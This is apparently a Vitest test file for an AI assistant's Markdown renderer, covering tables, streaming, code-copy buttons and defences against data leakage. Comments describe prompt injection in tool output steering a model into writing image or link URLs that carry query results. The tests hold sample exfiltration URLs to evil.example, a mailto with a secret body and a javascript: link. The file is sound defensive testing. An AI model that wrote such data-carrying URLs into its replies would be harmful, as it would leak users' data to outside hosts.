import { describe, it, expect } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Markdown } from "@/features/assistant/Markdown";

describe("Markdown", () => {
  it("renders a GFM table as a real table", () => {
    render(
      <Markdown>{`| Customer | Orders |\n|---|---:|\n| Alice | 3 |\n| Bob | 2 |`}</Markdown>,
    );
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(
      screen.getByRole("columnheader", { name: "Customer" }),
    ).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "Alice" })).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "3" })).toBeInTheDocument();
  });

  it("renders bold, inline code, and lists", () => {
    render(<Markdown>{`**important** and \`code\`\n\n- one\n- two`}</Markdown>);
    expect(screen.getByText("important").tagName).toBe("STRONG");
    expect(screen.getByText("code").tagName).toBe("CODE");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });
});

// Loading an image is a request the reader never chose to make. A prompt
// injection in tool output could get the model to write an image whose URL
// carries query results, and the browser would deliver them on render.
const EXFIL = "Done. ![chart](https://evil.example/c.png?d=alice%2C42) Next.";

describe("Markdown images", () => {
  it("shows an image's alt text without loading it", () => {
    const { container } = render(<Markdown>{EXFIL}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[image: chart]")).toBeInTheDocument();
  });

  it("keeps a linked image to one link", () => {
    const { container } = render(
      <Markdown>{`[![logo](https://evil.example/l.png)](https://example.com)`}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a a")).toBeNull();
    expect(screen.getByRole("link")).toHaveTextContent("[image: logo]");
  });

  it("never loads an image at any point of a stream", () => {
    for (let end = 1; end <= EXFIL.length; end++) {
      const { container, unmount } = render(
        <Markdown streaming>{EXFIL.slice(0, end)}</Markdown>,
      );
      expect(container.querySelector("img"), `frame ${end}`).toBeNull();
      unmount();
    }
  });
});

// A reply arriving token by token is re-parsed in full on every frame, so an
// unfinished construct used to render as whatever it currently looked like:
// table header cells as literal pipes in the sentence above them, a bare fence
// marker as an empty code block. The text then jumped into place once the
// construct closed.
const ANSWER = [
  "Here are the **three** biggest tables:",
  "",
  "| Table | Rows |",
  "|---|---:|",
  "| events | 42 |",
  "| users | 7 |",
  "",
  "Then run this:",
  "",
  "```sql",
  "SELECT count(*) FROM events",
  "```",
  "",
  "That should do it.",
].join("\n");

/** The accumulated text after each frame of a chunked stream of `ANSWER`. */
function prefixes(chunkSize: number): string[] {
  const frames: string[] = [];
  for (let end = chunkSize; end < ANSWER.length; end += chunkSize) {
    frames.push(ANSWER.slice(0, end));
  }
  frames.push(ANSWER);
  return frames;
}

/**
 * The rendered text outside code, where markdown control characters are markup
 * rather than content — a code block legitimately contains `count(*)`.
 */
function proseText(container: HTMLElement): string {
  const clone = container.cloneNode(true) as HTMLElement;
  clone.querySelectorAll("pre, code").forEach((el) => el.remove());
  return clone.textContent ?? "";
}

describe("Markdown while streaming", () => {
  it.each([3, 7, 16])(
    "never renders raw markup at %i chars per frame",
    (chunkSize) => {
      // Each frame gets its own mount, so every prefix is asserted on: the
      // throttle starts out holding the value it is first given, so a fresh
      // render shows exactly that frame with no timing to wait on.
      for (const frame of prefixes(chunkSize)) {
        const { container, unmount } = render(
          <Markdown streaming>{frame}</Markdown>,
        );
        // A lone `*` is allowed through: it survives for the single frame
        // between the two halves of a `**`, which is the price of never
        // deleting a bullet or a literal `SELECT *`.
        expect(
          proseText(container),
          `frame: ${JSON.stringify(frame)}`,
        ).not.toMatch(/[|`]|\*\*/);
        unmount();
      }
    },
  );

  it("does not flash an empty code block for a half-typed fence", () => {
    // The frame where the fence marker has arrived but its body has not.
    const partial = ANSWER.slice(0, ANSWER.indexOf("```sql") + 4);
    const { container } = render(<Markdown streaming>{partial}</Markdown>);

    expect(container.querySelector("pre")).toBeNull();
    expect(screen.getByText("Then run this:")).toBeInTheDocument();
  });

  it("still renders the whole answer once the stream finishes", async () => {
    const { container } = render(<Markdown streaming>{ANSWER}</Markdown>);

    await waitFor(() => expect(screen.getByRole("table")).toBeInTheDocument());
    expect(screen.getByRole("cell", { name: "events" })).toBeInTheDocument();
    expect(container.querySelector("pre")?.textContent).toContain(
      "SELECT count(*) FROM events",
    );
    expect(screen.getByText("three").tagName).toBe("STRONG");
  });

  it("leaves a persisted transcript's markup untouched", () => {
    const streamed = render(<Markdown streaming>{ANSWER}</Markdown>);
    const persisted = render(<Markdown>{ANSWER}</Markdown>);
    expect(persisted.container.innerHTML).toBe(streamed.container.innerHTML);
  });
});

// What a model writes can be steered by text it read, so a link it writes can carry
// data in its address, and a click is the one step left to the reader. In text a
// model wrote, only a link into this app is clickable; any other address is shown in
// full so the reader sees where it goes.
describe("Markdown links in text a model wrote", () => {
  const LEAK = "[Open the report](https://evil.example/r?d=alice%2C42)";

  it("shows another site's address in full instead of linking it", () => {
    const { container } = render(<Markdown links="named">{LEAK}</Markdown>);

    expect(container.querySelector("a")).toBeNull();
    expect(container).toHaveTextContent(
      "Open the report (https://evil.example/r?d=alice%2C42)",
    );
  });

  it("still links a page of this app", () => {
    render(
      <Markdown links="named">{"See [the catalog](/acme/catalog)."}</Markdown>,
    );

    expect(screen.getByRole("link", { name: "the catalog" })).toHaveAttribute(
      "href",
      "/acme/catalog",
    );
  });

  it("links an absolute address on this origin", () => {
    const own = `${window.location.origin}/acme/queries/q1`;
    render(<Markdown links="named">{`[the run](${own})`}</Markdown>);

    expect(screen.getByRole("link", { name: "the run" })).toHaveAttribute(
      "href",
      own,
    );
  });

  it("does not say an address twice when the address is the label", () => {
    const { container } = render(
      <Markdown links="named">{"Visit https://evil.example/x now"}</Markdown>,
    );

    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent?.match(/evil\.example/g)).toHaveLength(1);
  });

  it.each([
    "[mail me](mailto:a@evil.example?body=secret)",
    "[run](javascript:alert(1))",
    "[ftp](ftp://evil.example/x)",
    "[protocol-relative](//evil.example/x)",
  ])("never makes %s clickable", (markdown) => {
    const { container } = render(<Markdown links="named">{markdown}</Markdown>);

    expect(container.querySelector("a")).toBeNull();
  });

  it("names the address of a linked image too", () => {
    const { container } = render(
      <Markdown links="named">
        {"[![logo](https://evil.example/l.png)](https://example.com)"}
      </Markdown>,
    );

    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("[image: logo] (https://example.com)");
  });

  it("never links another site at any point of a stream", () => {
    for (let end = 1; end <= LEAK.length; end++) {
      const { container, unmount } = render(
        <Markdown links="named" streaming>
          {LEAK.slice(0, end)}
        </Markdown>,
      );
      expect(container.querySelector("a"), `frame ${end}`).toBeNull();
      unmount();
    }
  });

  it("leaves links in text a person wrote as they were", () => {
    render(<Markdown>{LEAK}</Markdown>);

    expect(
      screen.getByRole("link", { name: "Open the report" }),
    ).toHaveAttribute("href", "https://evil.example/r?d=alice%2C42");
  });
});

describe("Markdown code blocks", () => {
  it("copies the code, without the newline that ends the block", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"```sql\nSELECT 1;\n```"}</Markdown>);

    await user.click(screen.getByRole("button", { name: "Copy code" }));

    expect(await navigator.clipboard.readText()).toBe("SELECT 1;");
  });

  it("offers a copy for each block, not only the first", () => {
    render(<Markdown>{"```\na\n```\n\ntext\n\n```\nb\n```"}</Markdown>);

    expect(screen.getAllByRole("button", { name: "Copy code" })).toHaveLength(
      2,
    );
  });

  it("puts no copy button on inline code", () => {
    render(<Markdown>{"use `SELECT 1` here"}</Markdown>);

    expect(
      screen.queryByRole("button", { name: "Copy code" }),
    ).not.toBeInTheDocument();
  });
});
